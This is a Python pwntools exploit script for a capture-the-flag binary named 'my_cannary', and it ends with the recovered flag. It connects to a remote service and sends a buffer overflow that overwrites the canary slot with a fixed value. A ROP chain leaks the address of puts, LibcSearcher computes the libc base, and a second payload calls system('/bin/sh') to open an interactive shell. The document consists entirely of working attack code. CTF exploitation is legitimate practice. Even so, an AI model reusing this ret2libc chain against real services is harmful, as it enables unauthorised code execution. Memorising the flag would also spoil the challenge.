#!/usr/bin/env python
# -*- coding: utf-8 -*-
from LibcSearcher import *
from pwn import *

debug = 0
# context(log_level="debug", arch="amd64", os="linux")
if debug == 1:
    p = process('./my_cannary')
else:
    p = remote('183.129.189.60', 10026)
elf = ELF('./my_cannary', checksec=False)
plt_puts = elf.plt['puts']
got_puts = elf.got['puts']
addr_rdi_ret = 0x400a43  # pop rdi ; ret
addr_test = 0x4008EA


# gdb.attach(p, "b *0x400982\nc")
pd = 'a' * 0x30
pd += p64(0x400008)
pd += '\x00' * 0x10
pd += p64(addr_rdi_ret)
pd += p64(got_puts)
pd += p64(plt_puts)
pd += p64(addr_test)
p.sendafter("Now let's begin\n", pd)

addr_puts = u64(p.recv(6).ljust(8, '\x00'))
libc = LibcSearcher('puts', addr_puts)
libcbase = addr_puts - libc.dump('puts')
addr_system = libcbase + libc.dump('system')
addr_bin_sh = libcbase + libc.dump('str_bin_sh')
success('addr_puts   = ' + hex(addr_puts))
success('addr_system = ' + hex(addr_system))

pd = 'a' * 0x30
pd += p64(0x400008)
pd += '\x00' * 0x10
pd += p64(addr_rdi_ret)
pd += p64(addr_bin_sh)
pd += p64(addr_system)
p.sendafter("Now let's begin\n", pd)
p.interactive()
# GXY{assembly_magic2Y5GR}